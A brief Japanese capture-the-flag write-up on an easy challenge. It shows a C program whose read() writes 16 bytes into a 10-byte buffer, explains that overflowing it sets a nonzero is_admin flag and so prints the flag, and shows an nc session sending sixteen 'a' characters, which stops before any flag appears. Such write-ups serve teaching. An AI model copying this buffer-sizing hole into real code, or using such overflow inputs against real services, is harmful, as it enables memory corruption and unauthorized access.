# a fact of CTF ( 2025/12/2 )
## Description
Cでは、0がFalse、それ以外がTrueとして扱われます。
## Solve
配布されるmain.cは以下の通りです。
``` c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
  char buf[10] = {0};
  int is_admin = 0;
  printf("name:");
  read(0, buf, 0x10);
  printf("Hello, %s\n", buf);
  if (!is_admin) {
    puts("You are not admin. bye");
  } else {
    system("/bin/cat ./flag.txt");
  }
  return 0;
}

__attribute__((constructor)) void init() {
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);
  alarm(120);
}
```
ここで、Descriptionの通り、Cでは0がFalse,それ以外がTrueとして扱われて評価が行われます。
また、nameのユーザー入力を受け取ったのち、readでbufに書き込む際、本来10[10]とすべきところを0x10[16](=16[10])としてしまっています。
このことから、bufについてオーバーフローが発生してしまいます。本来はアドレスを計算するべきですが、今回はeasy問題の"simple"overflowなので、適当に16文字送って書き換えてしまえば通りそう、とあたりをつけます。
## Solver
```
└─$ nc 34.170.146.252 44061
name:aaaaaaaaaaaaaaaa
Hello, aaaaaaaaaaaaaaaaC��
```